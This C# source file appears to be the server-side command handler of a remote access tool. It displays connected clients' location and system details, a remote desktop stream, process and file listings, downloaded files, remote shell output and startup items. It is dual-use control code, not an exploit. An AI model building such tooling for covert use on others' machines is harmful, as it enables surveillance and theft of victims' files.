using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Extensions;
using xServer.Core.Helper;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;
using xServer.Settings;

namespace xServer.Core.Commands
{
    public static class CommandHandler
    {
        private const string DELIMITER = "$E$";

        public static void HandleInitialize(Client client, Initialize packet)
        {
            if (client.EndPoint.Address.ToString() == "255.255.255.255")
                return;

            FrmMain.Instance.Invoke((MethodInvoker) delegate
            {
                try
                {
                    client.Value.Version = packet.Version;
                    client.Value.OperatingSystem = packet.OperatingSystem;
                    client.Value.AccountType = packet.AccountType;
                    client.Value.Country = packet.Country;
                    client.Value.CountryCode = packet.CountryCode;
                    client.Value.Region = packet.Region;
                    client.Value.City = packet.City;
                    client.Value.Id = packet.Id;
                    client.Value.HostName = packet.HostName;
                    client.Value.Lanip = packet.Lanip;

                    if (!FrmMain.Instance.ListenServer.AllTimeConnectedClients.ContainsKey(client.Value.Id))
                        FrmMain.Instance.ListenServer.AllTimeConnectedClients.Add(client.Value.Id, DateTime.Now);

                    FrmMain.Instance.ListenServer.ConnectedClients++;
                    FrmMain.Instance.UpdateWindowTitle(FrmMain.Instance.ListenServer.ConnectedClients,
                        FrmMain.Instance.lstClients.SelectedItems.Count);

                    string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

                    // this " " leaves some space between the flag-icon and the IP
                    ListViewItem lvi = new ListViewItem(new string[]
                    {
                        " " + client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString(), client.Value.Version,
                        "Connected",
                        "Active", country, client.Value.OperatingSystem, client.Value.AccountType,client.Value.Lanip,client.Value.HostName
                    }) {Tag = client, ImageIndex = packet.ImageIndex};


                    FrmMain.Instance.lstClients.Items.Add(lvi);

                    if (XMLSettings.ShowPopup)
                        ShowPopup(client);

                    client.Value.IsAuthenticated = true;
                    new Packets.ServerPackets.GetSystemInfo().Execute(client);
                }
                catch
                {
                }
            });
        }

        private static void ShowPopup(Client c)
        {
            FrmMain.Instance.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
                string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                    c.Value.OperatingSystem), ToolTipIcon.Info);
        }

        public static void HandleStatus(Client client, Status packet)
        {
            FrmMain.Instance.Invoke((MethodInvoker) delegate
            {
                foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
                {
                    Client c = (Client) lvi.Tag;
                    if (client == c)
                    {
                        lvi.SubItems[3].Text = packet.Message;
                        break;
                    }
                }
            });
        }

        public static void HandleUserStatus(Client client, UserStatus packet)
        {
            FrmMain.Instance.Invoke((MethodInvoker) delegate
            {
                foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
                {
                    Client c = (Client) lvi.Tag;
                    if (client == c)
                    {
                        lvi.SubItems[4].Text = packet.Message;
                        break;
                    }
                }
            });
        }

        public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
        {
            if (client.Value.FrmRdp == null)
                return;

            if (packet.Image == null)
            {
                try
                {
                    client.Value.FrmRdp.Invoke(
                        (MethodInvoker) delegate { client.Value.FrmRdp.picDesktop.Image = client.Value.LastDesktop; });
                }
                catch
                {
                }

                client.Value.LastDesktop = null;
                client.Value.LastDesktopSeen = true;

                return;
            }

            // we can not dispose all bitmaps here, cause they are later used again in `client.Value.LastDesktop`
            if (client.Value.LastDesktop == null)
            {
                client.Value.StreamCodec = new UnsafeStreamCodec();
                if (client.Value.LastQuality != packet.Quality || client.Value.LastMonitor != packet.Monitor)
                {
                    client.Value.LastQuality = packet.Quality;
                    client.Value.LastMonitor = packet.Monitor;
                }

                using (MemoryStream ms = new MemoryStream(packet.Image))
                {
                    Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);

                    client.Value.LastDesktop = newScreen;

                    try
                    {
                        client.Value.FrmRdp.Invoke(
                            (MethodInvoker)
                                delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap) newScreen.Clone(); });
                    }
                    catch
                    {
                    }

                    newScreen = null;
                }
            }
            else
            {
                using (MemoryStream ms = new MemoryStream(packet.Image))
                {
                    lock (client.Value.StreamCodec)
                    {
                        if (client.Value.LastQuality != packet.Quality || client.Value.LastMonitor != packet.Monitor)
                        {
                            client.Value.StreamCodec = new UnsafeStreamCodec();
                            client.Value.LastQuality = packet.Quality;
                            client.Value.LastMonitor = packet.Monitor;
                        }

                        Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);

                        client.Value.LastDesktop = newScreen;

                        try
                        {
                            client.Value.FrmRdp.Invoke(
                                (MethodInvoker)
                                    delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap) newScreen.Clone(); });
                        }
                        catch
                        {
                        }

                        newScreen = null;
                    }
                }
            }

            packet.Image = null;
            client.Value.LastDesktopSeen = true;
        }

        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
        {
            if (client.Value.FrmTm == null)
                return;

            client.Value.FrmTm.Invoke((MethodInvoker) delegate { client.Value.FrmTm.lstTasks.Items.Clear(); });

            new Thread(() =>
            {
                for (int i = 0; i < packet.Processes.Length; i++)
                {
                    if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
                    {
                        ListViewItem lvi =
                            new ListViewItem(new string[]
                            {packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i]});
                        try
                        {
                            client.Value.FrmTm.Invoke(
                                (MethodInvoker) delegate { client.Value.FrmTm.lstTasks.Items.Add(lvi); });
                        }
                        catch
                        {
                            break;
                        }
                    }
                }
            }).Start();
        }

        public static void HandleDrivesResponse(Client client, DrivesResponse packet)
        {
            if (client.Value.FrmFm == null)
                return;

            client.Value.FrmFm.Invoke((MethodInvoker) delegate
            {
                client.Value.FrmFm.cmbDrives.Items.Clear();
                client.Value.FrmFm.cmbDrives.Items.AddRange(packet.Drives);
                client.Value.FrmFm.cmbDrives.SelectedIndex = 0;
            });
        }

        public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
        {
            if (client.Value.FrmFm == null)
                return;

            client.Value.FrmFm.Invoke((MethodInvoker) delegate { client.Value.FrmFm.lstDirectory.Items.Clear(); });

            new Thread(() =>
            {
                ListViewItem lviBack = new ListViewItem(new string[] {"..", "", "Directory"})
                {
                    Tag = "dir",
                    ImageIndex = 0
                };

                client.Value.FrmFm.Invoke(
                    (MethodInvoker) delegate { client.Value.FrmFm.lstDirectory.Items.Add(lviBack); });

                if (packet.Folders.Length != 0)
                {
                    for (int i = 0; i < packet.Folders.Length; i++)
                    {
                        if (packet.Folders[i] != DELIMITER)
                        {
                            ListViewItem lvi = new ListViewItem(new string[] {packet.Folders[i], "", "Directory"})
                            {
                                Tag = "dir",
                                ImageIndex = 1
                            };

                            try
                            {
                                client.Value.FrmFm.Invoke(
                                    (MethodInvoker) delegate { client.Value.FrmFm.lstDirectory.Items.Add(lvi); });
                            }
                            catch
                            {
                                break;
                            }
                        }
                    }
                }

                if (packet.Files.Length != 0)
                {
                    for (int i = 0; i < packet.Files.Length; i++)
                    {
                        if (packet.Files[i] != DELIMITER)
                        {
                            ListViewItem lvi =
                                new ListViewItem(new string[]
                                {packet.Files[i], Helper.Helper.GetFileSize(packet.FilesSize[i]), "File"})
                                {
                                    Tag = "file",
                                    ImageIndex = Helper.Helper.GetFileIcon(Path.GetExtension(packet.Files[i]))
                                };

                            try
                            {
                                client.Value.FrmFm.Invoke(
                                    (MethodInvoker) delegate { client.Value.FrmFm.lstDirectory.Items.Add(lvi); });
                            }
                            catch
                            {
                                break;
                            }
                        }
                    }
                }

                client.Value.LastDirectorySeen = true;
            }).Start();
        }

        public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
        {
            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
            if (!Directory.Exists(downloadPath))
                Directory.CreateDirectory(downloadPath);

            downloadPath = Path.Combine(downloadPath, packet.Filename);

            bool Continue = true;
            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
                if (
                    MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename),
                        "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                    Continue = false;

            if (client.Value.FrmFm == null)
            {
                new Packets.ServerPackets.DownloadFileCanceled(packet.ID).Execute(client);
                MessageBox.Show("Please keep the File Manager open.\n\nWarning: Download aborted", "Download aborted",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            int index = 0;
            try
            {
                client.Value.FrmFm.Invoke((MethodInvoker) delegate
                {
                    foreach (ListViewItem lvi in client.Value.FrmFm.lstTransfers.Items)
                    {
                        if (packet.ID.ToString() == lvi.SubItems[0].Text)
                        {
                            index = lvi.Index;
                            break;
                        }
                    }
                });
            }
            catch
            {
                return;
            }

            if (Continue)
            {
                if (!string.IsNullOrEmpty(packet.CustomMessage))
                {
                    client.Value.FrmFm.Invoke((MethodInvoker) delegate
                    {
                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = packet.CustomMessage;
                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
                    });
                    return;
                }

                FileSplit destFile = new FileSplit(downloadPath);
                if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
                {
                    client.Value.FrmFm.Invoke((MethodInvoker) delegate
                    {
                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = destFile.LastError;
                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
                    });
                    return;
                }

                decimal progress =
                    Math.Round((decimal) ((double) (packet.CurrentBlock + 1)/(double) packet.MaxBlocks*100.0), 2);

                client.Value.FrmFm.Invoke(
                    (MethodInvoker)
                        delegate
                        {
                            client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text =
                                string.Format("Downloading...({0}%)", progress);
                        });

                if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
                {
                    client.Value.FrmFm.Invoke((MethodInvoker) delegate
                    {
                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
                    });
                }
            }
            else
            {
                client.Value.FrmFm.Invoke((MethodInvoker) delegate
                {
                    client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
                    client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
                });
            }
        }

        public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
        {
            if (XMLSettings.ShowToolTip)
            {
                try
                {
                    FrmMain.Instance.lstClients.Invoke((MethodInvoker)delegate
                    {
                        foreach (ListViewItem item in FrmMain.Instance.lstClients.Items)
                        {
                            if (item.Tag == client)
                            {
                                var builder = new StringBuilder();
                                for (int i = 0; i < packet.SystemInfos.Length; i += 2)
                                {
                                    if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                                    {
                                        builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
                                    }
                                }
                                item.ToolTipText = builder.ToString();
                            }
                        }
                    });
                }
                catch
                {
                }
            }

            if (client.Value.FrmSi == null)
                return;

            ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length/2];
            for (int i = 0, j = 0; i < packet.SystemInfos.Length; i += 2, j++)
            {
                if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                {
                    lviCollection[j] = new ListViewItem(new string[] {packet.SystemInfos[i], packet.SystemInfos[i + 1]});
                }
            }

            try
            {
                client.Value.FrmSi.Invoke((MethodInvoker) delegate
                {
                    client.Value.FrmSi.lstSystem.Items.RemoveAt(2); // Loading... Information
                    foreach (var lviItem in lviCollection)
                    {
                        if (lviItem != null)
                            client.Value.FrmSi.lstSystem.Items.Add(lviItem);
                    }

                    ListViewExtensions.AutosizeColumns(client.Value.FrmSi.lstSystem);
                });
            }
            catch
            {
            }
        }

        public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
        {
            if (client.Value.FrmRdp == null)
                return;

            try
            {
                client.Value.FrmRdp.Invoke((MethodInvoker) delegate
                {
                    for (int i = 0; i < packet.Number; i++)
                        client.Value.FrmRdp.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                    client.Value.FrmRdp.cbMonitors.SelectedIndex = 0;
                });
            }
            catch
            {
            }
        }

        public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
        {
            if (client.Value.FrmRs == null)
                return;

            try
            {
                client.Value.FrmRs.Invoke(
                    (MethodInvoker) delegate { client.Value.FrmRs.txtConsoleOutput.Text += packet.Output; });
            }
            catch
            {
            }
        }

        public static void HandleGetStartupItemsResponse(Client client, GetStartupItemsResponse packet)
        {
            if (client.Value.FrmStm == null)
                return;

            try
            {
                foreach (var pair in packet.StartupItems)
                {
                    client.Value.FrmStm.Invoke((MethodInvoker) delegate
                    {
                        var temp = pair.Key.Split(new string[] {"||"}, StringSplitOptions.None);
                        var l = new ListViewItem(temp)
                        {
                            Group = client.Value.FrmStm.lstStartupItems.Groups[pair.Value],
                            Tag = pair.Value
                        };
                        client.Value.FrmStm.lstStartupItems.Items.Add(l);
                    });
                }
            }
            catch
            {
            }
        }
    }
}